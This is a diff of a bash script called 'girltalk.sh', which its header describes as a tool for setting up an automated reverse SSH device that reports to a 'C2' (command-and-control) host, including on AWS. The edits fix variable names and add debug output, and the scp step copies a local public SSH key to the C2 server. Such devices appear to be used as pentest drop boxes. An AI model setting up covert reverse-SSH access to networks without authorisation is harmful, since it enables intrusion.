@@ -1,3 +1,5 @@
+#!/bin/bash
+
 ################################################################
 #                                                              #
 # Let's setup an automated reverse ssh device!                 #
@@ -26,7 +28,7 @@ girltalk.sh:
   -u	C2 username.
   -l    Local username to use.
   -h	Help text and usage example.
-usage:	 girltalk.sh -c <C2 hostname/IP> -l <local_username> -u <C2_username> 
+usage:	 girltalk.sh -c <C2 hostname/IP> -l <local_username> -u <C2_username>
 example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface -a -k ~/.ssh/amazon.keypair.pem
 "
 
@@ -39,14 +41,14 @@ fi
 
 
 # Set flags.
-while getopts "a:k:s:n:c:u:l:h" FLAG
+while getopts "a:k:c:u:l:h" FLAG
 do
 	case $FLAG in
 		a)
 			AWS=1
 			;;
 		k)
-			KEYNAME=$OPTARG
+			KEY=$OPTARG
 			;;
 		c)
 			HOST=$OPTARG
@@ -128,11 +130,11 @@ done
 
 if [ ${AWS} -eq 1 ]; then
 
-    echo "I got here"
-    #ssh -i ${KEYNAME} ${USERC2}@${AWS}
+#    ssh -i ${KEY} ${USERC2}@${HOST}
 # Transferring local key to C2
     echo "${bold}### Copying key to C2 host ###"
-    scp -i ${KEY} /home/${USERLOCAL}/.ssh/id_rsa.pub ${USERC2}@${AWS}:/home/${USERC2}/.ssh/
+    echo "${USERLOCAL}, ${KEY}, ${USERC2}, ${HOST}"
+    scp -i ${KEY} /home/${USERLOCAL}/.ssh/id_rsa.pub ${USERC2}@${HOST}:/home/${USERC2}/.ssh/
     printf "\n"
     echo "I got here."
     exit
